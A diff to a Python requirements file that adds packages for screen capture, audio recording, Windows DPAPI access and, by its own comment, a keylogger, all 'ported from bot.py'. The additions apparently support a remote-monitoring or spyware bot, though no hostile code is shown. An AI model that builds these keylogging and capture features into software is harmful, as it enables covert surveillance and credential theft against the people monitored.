@@ -30,6 +30,26 @@ pathlib2>=2.3.0
 # Date and Time
 python-dateutil>=2.8.0
 
+# New Dependencies for Advanced Features (ported from bot.py)
+# Screen capture and streaming
+opencv-python>=4.5.0
+pyautogui>=0.9.53
+numpy>=1.21.0
+Pillow>=8.0.0
+
+# Audio recording
+sounddevice>=0.4.4
+wavio>=0.0.4
+
+# Input monitoring (keylogger)
+pynput>=1.7.6
+
+# Windows-specific dependencies (DPAPI)
+pywin32>=227; sys_platform == "win32"
+
+# Additional utility dependencies
+mimetypes2>=0.1.4
+
 # Optional AI Dependencies (for AI dashboard)
 # scikit-learn>=1.1.0
 # numpy>=1.21.0
